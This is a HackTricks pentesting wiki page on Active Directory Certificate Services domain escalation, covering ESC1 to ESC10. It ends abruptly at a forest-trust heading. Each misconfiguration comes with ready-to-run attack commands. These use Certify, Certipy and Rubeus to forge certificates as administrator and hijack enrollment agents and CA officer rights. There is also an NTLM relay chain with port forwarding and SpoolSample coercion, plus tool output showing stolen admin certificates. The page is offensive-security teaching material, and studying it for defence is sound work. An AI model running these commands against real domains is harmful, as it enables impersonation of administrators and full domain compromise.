# AD CS Domain Escalation

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Misconfigured Certificate Templates - ESC1

### Explanation

* The **Enterprise CA** grants **low-privileged users enrolment rights**
* **Manager approval is disabled**
* **No authorized signatures are required**
* An overly permissive **certificate template** security descriptor **grants certificate enrolment rights to low-privileged users**
* The **certificate template defines EKUs that enable authentication**:
  * _Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)._
* The **certificate template allows requesters to specify a subjectAltName in the CSR:**
  * **AD** will **use** the identity specified by a certificate’s **subjectAltName** (SAN) field **if** it is **present**. Consequently, if a requester can specify the SAN in a CSR, the requester can **request a certificate as anyone** (e.g., a domain admin user). The certificate template’s AD object **specifies** if the requester **can specify the SAN** in its **`mspki-certificate-name-`**`flag` property. The `mspki-certificate-name-flag` property is a **bitmask** and if the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag is **present**, a **requester can specify the SAN.**

{% hint style="danger" %}
These settings allow a **low-privileged user to request a certificate with an arbitrary SAN**, allowing the low-privileged user to authenticate as any principal in the domain via Kerberos or SChannel.
{% endhint %}

This is often enabled, for example, to allow products or deployment services to generate HTTPS certificates or host certificates on the fly. Or because of lack of knowledge.

Note that when a certificate with this last option is created a **warning appears**, but it doesn't appear if a **certificate template** with this configuration is **duplicated** (like the `WebServer` template which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled and then the admin might add an authentication OID).

### Abuse

To **find vulnerable certificate templates** you can run:

```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```

To **abuse this vulnerability to impersonate an administrator** one could run:

```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```

Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

The Windows binaries "Certreq.exe" & "Certutil.exe" can be abused to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Moreover, the following LDAP query when run against the AD Forest’s configuration schema can be used to **enumerate** **certificate templates** that do **not require approval/signatures**, that have a **Client Authentication or Smart Card Logon EKU**, and have the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag enabled:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### Explanation

The second abuse scenario is a variation of the first one:

1. The Enterprise CA grants low-privileged users enrollment rights.
2. Manager approval is disabled.
3. No authorized signatures are required.
4. An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
5. **The certificate template defines the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** allows an attacker to get a **certificate** for **any purpose** like client authentication, server authentication, code signing, etc. The same **technique as for ESC3** can be used to abuse this.

A **certificate with no EKUs** — a subordinate CA certificate —  can be abused for **any purpose** as well but could **also use it to sign new certificates**. As such, using a subordinate CA certificate, an attacker could **specify arbitrary EKUs or fields in the new certificates.**

However, if the **subordinate CA is not trusted** by the **`NTAuthCertificates`** object (which it won’t be by default), the attacker **cannot create new certificates** that will work for **domain authentication**. Still, the attacker can create **new certificates with any EKU** and arbitrary certificate values, of which there’s **plenty** the attacker could potentially **abuse** (e.g., code signing, server authentication, etc.) and might have large implications for other applications in the network like SAML, AD FS, or IPSec.

The following LDAP query when run against the AD Forest’s configuration schema can be used to enumerate templates matching this scenario:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

1. The Enterprise CA allows low-privileged users enrollment rights.
2. Manager approval is disabled.
3. No authorized signatures are required.
4. An overly permissive certificate template security descriptor allows certificate enrollment rights to low-privileged users.
5. The **certificate template defines the Certificate Request Agent EKU**. The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.

**Requirements 2:**

1. The Enterprise CA allows low-privileged users enrollment rights.
2. Manager approval is disabled.
3. **The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU.**
4. The certificate template defines an EKU that allows for domain authentication.
5. Enrollment agent restrictions are not implemented on the CA.

### Abuse

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Enterprise CAs can **constrain** the **users** who can **obtain** an **enrollment agent certificate**, the templates enrollment **agents can enroll in**, and which **accounts** the enrollment agent can **act on behalf of** by opening `certsrc.msc` `snap-in -> right clicking on the CA -> clicking Properties -> navigating` to the “Enrollment Agents” tab.

However, the **default** CA setting is “**Do not restrict enrollment agents”.** Even when administrators enable “Restrict enrollment agents”, the default setting is extremely permissive, allowing Everyone access enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**Certificate templates** have a **security descriptor** that specifies which AD **principals** have specific **permissions over the template**.

If an **attacker** has enough **permissions** to **modify** a **template** and **create** any of the exploitable **misconfigurations** from the **previous sections**, he will be able to exploit it and **escalate privileges**.

Interesting rights over certificate templates:

* **Owner:** Implicit full control of the object, can edit any properties.
* **FullControl:** Full control of the object, can edit any properties.
* **WriteOwner:** Can modify the owner to an attacker-controlled principal.
* **WriteDacl**: Can modify access control to grant an attacker FullControl.
* **WriteProperty:** Can edit any properties

### Abuse

An example of a privesc like the previous one:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Vulnerable PKI Object Access Control - ESC5

### Explanation

The web of interconnected ACL based relationships that can affect the security of AD CS is extensive. Several **objects outside of certificate** templates and the certificate authority itself can have a **security impact on the entire AD CS system**. These possibilities include (but are not limited to):

* The **CA server’s AD computer object** (i.e., compromise through S4U2Self or S4U2Proxy)
* The **CA server’s RPC/DCOM server**
* Any **descendant AD object or container in the container** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.)

If a low-privileged attacker can gain **control over any of these**, the attack can likely **compromise the PKI system**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

There is another similar issue, described in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage), which involves the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag. As Microsoft describes, “**If** this flag is **set** on the CA, **any request** (including when the subject is built from Active Directory®) can have **user defined values** in the **subject alternative name**.”\
This means that an **attacker** can enroll in **ANY template** configured for domain **authentication** that also **allows unprivileged** users to enroll (e.g., the default User template) and **obtain a certificate** that allows us to **authenticate** as a domain admin (or **any other active user/machine**).

**Note**: the **alternative names** here are **included** in a CSR via the `-attrib "SAN:"` argument to `certreq.exe` (i.e., “Name Value Pairs”). This is **different** than the method for **abusing SANs** in ESC1 as it **stores account information in a certificate attribute vs a certificate extension**.

### Abuse

Organizations can **check if the setting is enabled** using the following `certutil.exe` command:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Underneath, this just uses **remote** **registry**, so the following command may work as well:

```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 
```

[**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) also checks for this and can be used to abuse this misconfiguration:

```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

These settings can be **set**, assuming **domain administrative** (or equivalent) rights, from any system:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

If you find this setting in your environment, you can **remove this flag** with:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

{% hint style="warning" %}
After the May 2022 security updates, new **certificates** will have a **securiy extension** that **embeds** the **requester's `objectSid` property**. For ESC1, this property will be reflected from the SAN specified, but with **ESC6**, this property reflects the **requester's `objectSid`**, and not from the SAN.\
As such, **to abuse ESC6**, the environment must be **vulnerable to ESC10** (Weak Certificate Mappings), where the **SAN is preferred over the new security extension**.
{% endhint %}

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

A certificate authority itself has a **set of permissions** that secure various **CA actions**. These permissions can be access from `certsrv.msc`, right clicking a CA, selecting properties, and switching to the Security tab:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

This can also be enumerated via [**PSPKI’s module**](https://www.pkisolutions.com/tools/pspki/) with `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:

```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```

The two main rights here are the **`ManageCA`** right and the **`ManageCertificates`** right, which translate to the “CA administrator” and “Certificate Manager”.

#### Abuse

If you have a principal with **`ManageCA`** rights on a **certificate authority**, we can use **PSPKI** to remotely flip the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bit to **allow SAN** specification in any template ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

This is also possible in a simpler form with [**PSPKI’s Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet.

The **`ManageCertificates`** rights permits to **approve a pending request**, therefore bypassing the "CA certificate manager approval" protection.

You can use a **combination** of **Certify** and **PSPKI** module to request a certificate, approve it, and download it:

```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

{% hint style="warning" %}
In the **previous attack** **`Manage CA`** permissions was used to **enable** the **EDITF\_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
{% endhint %}

Therefore, another attack is presented here.

Perquisites:

* Only **`ManageCA` permission**
* **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
* Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.

**This request will be denie**d, but we will save the private key and note down the request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

{% hint style="info" %}
In summary, if an environment has **AD CS installed**, along with a **vulnerable web enrollment endpoint** and at least one **certificate template published** that allows for **domain computer enrollment and client authentication** (like the default **`Machine`** template), then an **attacker can compromise ANY computer with the spooler service running**!
{% endhint %}

AD CS supports several **HTTP-based enrollment methods** via additional AD CS server roles that administrators can install. These HTTPbased certificate enrollment interfaces are all **vulnerable NTLM relay attacks**. Using NTLM relay, an attacker on a **compromised machine can impersonate any inbound-NTLM-authenticating AD account**. While impersonating the victim account, an attacker could access these web interfaces and **request a client authentication certificate based on the `User` or `Machine` certificate templates**.

* The **web enrollment interface** (an older looking ASP application accessible at `http://<caserver>/certsrv/`), by default only supports HTTP, which cannot protect against NTLM relay attacks. In addition, it explicitly only allows NTLM authentication via its Authorization HTTP header, so more secure protocols like Kerberos are unusable.
* The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) support negotiate authentication by default via their Authorization HTTP header. Negotiate authentication **support** Kerberos and **NTLM**; consequently, an attacker can **negotiate down to NTLM** authentication during relay attacks. These web services do at least enable HTTPS by default, but unfortunately HTTPS by itself does **not protect against NTLM relay attacks**. Only when HTTPS is coupled with channel binding can HTTPS services be protected from NTLM relay attacks. Unfortunately, AD CS does not enable Extended Protection for Authentication on IIS, which is necessary to enable channel binding.

Common **problems** with NTLM relay attacks are that the **NTLM sessions are usually short** and that the attacker **cannot** interact with services that **enforce NTLM signing**.

However, abusing a NTLM relay attack to obtain a certificate to the user solves this limitations, as the session will live as long as the certificate is valid and the certificate can be used to use services **enforcing NTLM signing**. To know how to use an stolen cert check:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Another limitation of NTLM relay attacks is that they **require a victim account to authenticate to an attacker-controlled machine**. An attacker could wait or could try to **force** it:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuse**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)’s `cas` command can enumerate **enabled HTTP AD CS endpoints**:

```
Certify.exe cas
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Enterprise CAs also **store CES endpoints** in their AD object in the `msPKI-Enrollment-Servers` property. **Certutil.exe** and **PSPKI** can parse and list these endpoints:

```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```

<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.

We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.

```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#5485" id="5485"></a>

### Explanation

ESC9 refers to the new **`msPKI-Enrollment-Flag`** value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`). If this flag is set on a certificate template, the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** will **not** be embedded. ESC9 is only useful when `StrongCertificateBindingEnforcement` is set to `1` (default), since a weaker certificate mapping configuration for Kerberos or Schannel can be abused as ESC10 — without ESC9 — as the requirements will be the same.

* `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag
* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* Certificate specifies any client authentication EKU
* `GenericWrite` over any account A to compromise any account B

### Abuse

In this case, `John@corp.local` has `GenericWrite` over `Jane@corp.local`, and we wish to compromise `Administrator@corp.local`. `Jane@corp.local` is allowed to enroll in the certificate template `ESC9` that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

First, we obtain the hash of `Jane` with for instance Shadow Credentials (using our `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Next, we change the `userPrincipalName` of `Jane` to be `Administrator`. Notice that we’re leaving out the `@corp.local` part.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

This is not a constraint violation, since the `Administrator` user’s `userPrincipalName` is `Administrator@corp.local` and not `Administrator`.

Now, we request the vulnerable certificate template `ESC9`. We must request the certificate as `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Notice that the `userPrincipalName` in the certificate is `Administrator` and that the issued certificate contains no “object SID”.

Then, we change back the `userPrincipalName` of `Jane` to be something else, like her original `userPrincipalName` `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Now, if we try to authenticate with the certificate, we will receive the NT hash of the `Administrator@corp.local` user. You will need to add `-domain <domain>` to your command line since there is no domain specified in the certificate.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Weak Certificate Mappings - ESC10

### Explanation

ESC10 refers to two registry key values on the domain controller.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Default value `0x18` (`0x8 | 0x10`), previously `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Default value `1`, previously `0`.

**Case 1**

`StrongCertificateBindingEnforcement` set to `0`

**Case 2**

`CertificateMappingMethods` contains `UPN` bit (`0x4`)

### Abuse Case 1

* `StrongCertificateBindingEnforcement` set to `0`
* `GenericWrite` over any account A to compromise any account B

In this case, `John@corp.local` has `GenericWrite` over `Jane@corp.local`, and we wish to compromise `Administrator@corp.local`. The abuse steps are almost identical to ESC9, except that any certificate template can be used.

First, we obtain the hash of `Jane` with for instance Shadow Credentials (using our `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Next, we change the `userPrincipalName` of `Jane` to be `Administrator`. Notice that we’re leaving out the `@corp.local` part.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

This is not a constraint violation, since the `Administrator` user’s `userPrincipalName` is `Administrator@corp.local` and not `Administrator`.

Now, we request any certificate that permits client authentication, for instance the default `User` template. We must request the certificate as `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Notice that the `userPrincipalName` in the certificate is `Administrator`.

Then, we change back the `userPrincipalName` of `Jane` to be something else, like her original `userPrincipalName` `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Now, if we try to authenticate with the certificate, we will receive the NT hash of the `Administrator@corp.local` user. You will need to add `-domain <domain>` to your command line since there is no domain specified in the certificate.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Abuse Case 2

* `CertificateMappingMethods` contains `UPN` bit flag (`0x4`)
* `GenericWrite` over any account A to compromise any account B without a `userPrincipalName` property (machine accounts and built-in domain administrator `Administrator`)

In this case, `John@corp.local` has `GenericWrite` over `Jane@corp.local`, and we wish to compromise the domain controller `DC$@corp.local`.

First, we obtain the hash of `Jane` with for instance Shadow Credentials (using our `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Next, we change the `userPrincipalName` of `Jane` to be `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

This is not a constraint violation, since the `DC$` computer account does not have `userPrincipalName`.

Now, we request any certificate that permits client authentication, for instance the default `User` template. We must request the certificate as `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

Then, we change back the `userPrincipalName` of `Jane` to be something else, like her original `userPrincipalName` (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Now, since this registry key applies to Schannel, we must use the certificate for authentication via Schannel. This is where Certipy’s new `-ldap-shell` option comes in.

If we try to authenticate with the certificate and `-ldap-shell`, we will notice that we’re authenticated as `u:CORP\DC$`. This is a string that is sent by the server.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

One of the available commands for the LDAP shell is `set_rbcd` which will set Resource-Based Constrained Delegation (RBCD) on the target. So we could perform a RBCD attack to compromise the domain controller.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternatively, we can also compromise any user account where there is no `userPrincipalName` set or where the `userPrincipalName` doesn’t match the `sAMAccountName` of that account. From my own testing, the default domain administrator `Administrator@corp.local` doesn’t have a `userPrincipalName` set by default, and this account should by default have more privileges in LDAP than domain controllers.

## Compromising Forests with Certificates

### CAs Trusts Breaking Forest Trusts

The setup for **cross-forest enrollment** is relatively simple. Administrators publish the **root CA certificate** from the resource forest **to the account forests** and add the **enterprise CA** certificates from the resource forest to the **`NTAuthCertificates`** and AIA containers **in each account forest**. To be clear, this means that the **CA** in the resource forest has **complete control** over all **other forests it manages PKI for**. If attackers **compromise this CA**, they can **forge certificates for all users in the resource and account forests**, breaking the forest security boundary.

### Foreign Principals With Enrollment Privileges

